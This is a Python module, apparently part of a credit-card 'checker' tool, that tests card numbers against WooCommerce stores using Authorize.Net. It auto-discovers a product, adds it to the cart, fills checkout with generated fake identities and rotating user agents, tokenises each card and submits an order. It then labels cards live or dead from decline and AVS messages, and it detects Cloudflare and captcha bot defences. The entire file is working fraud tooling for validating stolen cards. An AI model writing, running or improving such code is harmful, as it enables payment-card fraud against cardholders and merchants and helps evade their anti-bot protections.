"""
checker.py — Authorize.Net CIM gateway module.
Pluggable: returns structured dicts, no file I/O, no prints.
All shared helpers live in utils.py.
"""

import json
import re

import requests
import urllib3

urllib3.disable_warnings()

from utils import (
    REQUEST_TIMEOUT,
    build_plain_session,
    convert_year,
    detect_card_type,
    discover_product_id,
    fetch_identity,
    get_str,
    random_ua,
    session_id,
)

# WooCommerce Authorize.Net CIM expects these card type values
_WC_BRAND = {"VI": "VISA", "MC": "MC", "AE": "AE", "DI": "DI"}


# ── Authorize.Net CIM ─────────────────────────────────────────────────────────

def check_authnet(
    session: requests.Session,
    authnet_domain: str,
    product_id: str,
    card_tuple: tuple,
    start_time: str = "",
    idid: str = "",
) -> dict:
    """
    Check one card against a WooCommerce + Authorize.Net CIM store.
    product_id may be "" — the function will auto-discover it from the storefront.
    Returns:
        {
          "status":  "live" | "dead" | "unknown",
          "message": str,
          "amount":  str,
          "card":    "cc|mm|yy|cvv",
        }
    """
    cc, mm, yy, cvv = card_tuple
    yy    = convert_year(yy)
    ua    = random_ua()
    brand = _WC_BRAND.get(detect_card_type(cc), "VISA")
    card_str = f"{cc}|{mm}|{yy}" + (f"|{cvv}" if cvv else "")
    last4 = cc[-4:] if len(cc) >= 4 else cc
    yy2   = yy[2:] if len(yy) == 4 else yy

    if not idid:
        idid = session_id()

    # Auto-discover product_id if not supplied
    if not product_id:
        product_id = discover_product_id(session, authnet_domain)
        if not product_id:
            return {
                "status":  "unknown",
                "message": "Could not find product on store",
                "amount":  "",
                "card":    card_str,
            }

    # fetch_identity uses the local eonxgen API (127.0.0.1:8001) — no proxy needed
    identity = fetch_identity(build_plain_session())
    first  = identity["fname"]
    last   = identity["lname"]
    password = identity["password"]
    street = identity["street"]
    city   = identity["city"]
    state  = identity["state"]
    zip_   = identity["zip"]
    email  = identity["email"]
    phone  = identity["phone"]

    # ── 1. Add to cart (retry up to 10×) ──────────────────────────────────────
    atc_ok = False
    for _ in range(10):
        try:
            r = session.post(
                f"https://{authnet_domain}/?wc-ajax=add_to_cart",
                data={"product_id": product_id, "quantity": "1"},
                headers={
                    "User-Agent":      ua,
                    "Accept":          "application/json, text/javascript, */*; q=0.01",
                    "Content-Type":    "application/x-www-form-urlencoded; charset=UTF-8",
                    "X-Requested-With": "XMLHttpRequest",
                },
                timeout=REQUEST_TIMEOUT,
            )
            if '"error":true' not in (r.text or ""):
                atc_ok = True
                break
        except Exception:
            pass

    if not atc_ok:
        return {"status": "unknown", "message": "ATC Error (10 retries)", "amount": "", "card": card_str}

    # ── 2. Load checkout page ──────────────────────────────────────────────────
    try:
        r = session.get(
            f"https://{authnet_domain}/checkout/",
            headers={"User-Agent": ua, "Upgrade-Insecure-Requests": "1"},
            timeout=REQUEST_TIMEOUT,
        )
        ccc = r.text
    except Exception as e:
        return {"status": "unknown", "message": f"Checkout fetch: {e}", "amount": "", "card": card_str}

    nonce        = get_str(ccc, 'name="woocommerce-process-checkout-nonce" value="', '"')
    api_login_id = get_str(ccc, 'data-apiLoginID="', '"')
    client_key   = get_str(ccc, 'data-clientKey="', '"')

    # Try to capture the order total from the WC order-review table row first
    total = ""
    _total_patterns = [
        # order-total / total row in WC checkout order review
        r'order[_-]total.*?<(?:span|bdi)[^>]*>.*?<span[^>]*>\s*([^<]+?)\s*</span>\s*([\d.,]+)',
        r'<tr[^>]*class="[^"]*order-total[^"]*".*?<(?:span|bdi)[^>]*>\s*(?:[^<]*<[^>]+>)?\s*([\d.,]+)',
        # amount / totals block
        r'class="woocommerce-Price-amount[^"]*"[^>]*>.*?<span[^>]*>[^<]*</span>\s*([\d.,]+)',
        # generic: currencySymbol + number (last resort)
        r'<span class="woocommerce-Price-currencySymbol">([^<]*)</span>\s*([\d.,]+)',
    ]
    for _pat in _total_patterns:
        _m = re.search(_pat, ccc, re.IGNORECASE | re.DOTALL)
        if _m:
            # last capture group is always the numeric amount
            _num = _m.group(_m.lastindex)
            _sym = _m.group(_m.lastindex - 1) if _m.lastindex > 1 else "$"
            _sym = re.sub(r'<[^>]+>', '', _sym).strip() or "$"
            total = f"{_sym}{_num}"
            break

    # ── 3. Get Authorize.Net payment token (direct — no proxy) ────────────────
    try:
        r = build_plain_session().post(
            "https://api2.authorize.net/xml/v1/request.api",
            data=json.dumps({
                "securePaymentContainerRequest": {
                    "merchantAuthentication": {"name": api_login_id, "clientKey": client_key},
                    "data": {
                        "type": "TOKEN",
                        "id":   idid,
                        "token": {"cardNumber": cc, "expirationDate": f"{mm}{yy}"},
                    },
                }
            }),
            headers={"User-Agent": ua, "Accept": "*/*", "Content-Type": "application/json; charset=utf-8"},
            timeout=REQUEST_TIMEOUT,
        )
        card_nonce = get_str(r.text, '"dataValue":"', '"')
    except Exception:
        card_nonce = ""

    # ── 4. WooCommerce AJAX checkout ───────────────────────────────────────────
    wc_payload = {
        "wc_order_attribution_session_entry":      f"https://{authnet_domain}/",
        "wc_order_attribution_session_start_time": start_time,
        "wc_order_attribution_session_pages":      "4",
        "wc_order_attribution_session_count":      "1",
        "wc_order_attribution_user_agent":         ua,
        "billing_first_name":  first,
        "billing_last_name":   last,
        "billing_company":     "",
        "billing_country":     "US",
        "billing_address_1":   street,
        "billing_address_2":   "",
        "billing_city":        city,
        "billing_state":       state,
        "billing_postcode":    zip_,
        "billing_phone":       phone,
        "billing_email":       email,
        "account_password":    password,
        "order_comments":      "",
        "payment_method":                                  "authorize_net_cim_credit_card",
        "wc-authorize-net-cim-credit-card-expiry":         f"{mm} / {yy2}",
        "wc-authorize-net-cim-credit-card-payment-nonce":  card_nonce,
        "wc-authorize-net-cim-credit-card-payment-descriptor": "COMMON.ACCEPT.INAPP.PAYMENT",
        "wc-authorize-net-cim-credit-card-last-four":      last4,
        "wc-authorize-net-cim-credit-card-card-type":      brand,
        "woocommerce-process-checkout-nonce":               nonce,
        "_wp_http_referer": "/?wc-ajax=update_order_review",
    }

    try:
        r = session.post(
            f"https://{authnet_domain}/?wc-ajax=checkout",
            data=wc_payload,
            headers={
                "User-Agent":       ua,
                "Accept":           "application/json, text/javascript, */*; q=0.01",
                "Content-Type":     "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With": "XMLHttpRequest",
            },
            timeout=REQUEST_TIMEOUT,
        )
        eee = r.text or ""
        http_status = r.status_code
    except Exception as e:
        return {"status": "unknown", "message": f"Checkout POST: {e}", "amount": total, "card": card_str}

    # ── 5. Parse response ──────────────────────────────────────────────────────

    # HTTP-level blocks (before anything else)
    if http_status == 429:
        return {"status": "unknown", "message": "Rate Limited (429)", "amount": total, "card": card_str}
    if http_status in (403, 503):
        return {"status": "unknown", "message": f"HTTP {http_status} — Blocked/Unavailable", "amount": total, "card": card_str}

    # Try JSON parse first — a real bot/challenge page is never valid JSON
    try:
        parsed = json.loads(eee)
    except Exception:
        # Not JSON → likely a bot/firewall challenge page or broken store
        # NOW scan the raw HTML for bot markers
        _BOT_MARKERS = [
            "cf-ray",
            "cloudflare",
            "just a moment",
            "enable javascript",
            "checking your browser",
            "ddos-guard",
            "please wait",
            "captcha",
            "recaptcha",
            "hcaptcha",
            "access denied",
            "403 forbidden",
            "your ip",
            "rate limit",
            "too many requests",
            "bot detection",
            "security check",
            "please verify",
            "verify you are human",
        ]
        _eee_lower = eee.lower()
        for _marker in _BOT_MARKERS:
            if _marker in _eee_lower:
                return {"status": "unknown", "message": f"Bot/Firewall: {_marker.title()}", "amount": total, "card": card_str}
        snippet = re.sub(r"<[^>]+>", " ", eee)[:120].strip()
        return {"status": "unknown", "message": f"Non-JSON response: {snippet or 'empty'}", "amount": total, "card": card_str}

    # --- Definitive success -----------------------------------------------------
    if parsed.get("result") == "success":
        return {"status": "live", "message": "Charged", "amount": total, "card": card_str}

    # --- Extract human-readable message from WC response -----------------------
    raw_msg = parsed.get("messages", "") or parsed.get("message", "") or ""
    mo = re.search(r"<li[^>]*>(.*?)</li>", raw_msg, re.IGNORECASE | re.DOTALL)
    message = re.sub(r"<[^>]*>", "", mo.group(1)).strip() if mo else re.sub(r"<[^>]+>", " ", str(raw_msg)).strip()[:200]
    if not message:
        message = str(parsed.get("messages", "") or parsed.get("message", "") or "Unknown response")[:200]

    # --- AVS / soft-decline → LIVE ----------------------------------------------
    LIVE_MSGS = [
        "address does not match",
        "avs mismatch",
        "avs",
        "address verification",
        "billing address",
        "zip code does not match",
        "postal code",
    ]
    for s in LIVE_MSGS:
        if s in message.lower():
            return {"status": "live", "message": "AVS Mismatch", "amount": total, "card": card_str}

    # --- Hard declines → DEAD ---------------------------------------------------
    DEAD_MSGS = [
        "the provided card was declined",
        "declined",
        "do not honor",
        "do not try again",
        "transaction declined",
        "card was declined",
        "payment declined",
        "insufficient funds",
        "not sufficient funds",
        "invalid card number",
        "the credit card number is invalid",
        "card number is incorrect",
        "invalid account number",
        "card code is invalid",
        "invalid cvv",
        "security code",
        "cvv2",
        "cvc",
        "expired card",
        "card has expired",
        "expiration date",
        "invalid expiry",
        "lost card",
        "stolen card",
        "pickup card",
        "restricted card",
        "card not supported",
        "this card type is not accepted",
        "card type not accepted",
        "transaction not allowed",
        "exceeds limit",
        "limit exceeded",
        "blocked",
        "fraud",
        "suspected fraud",
        "bank declined",
        "issuer declined",
        "issuing bank",
        "call your bank",
        "contact your bank",
        "an error occurred, please try again or try an alternate form of payment",
        "we were unable to process your order",
        "unable to process your order",
        "unable to process your payment",
        "payment could not be processed",
        "order could not be placed",
        "please try again or try an alternate",
    ]
    for s in DEAD_MSGS:
        if s in message.lower():
            return {"status": "dead", "message": message[:120], "amount": total, "card": card_str}

    # --- Everything else → UNKNOWN (captcha slip-through, config errors, etc.) --
    return {"status": "unknown", "message": message[:120] or "Unknown response", "amount": total, "card": card_str}
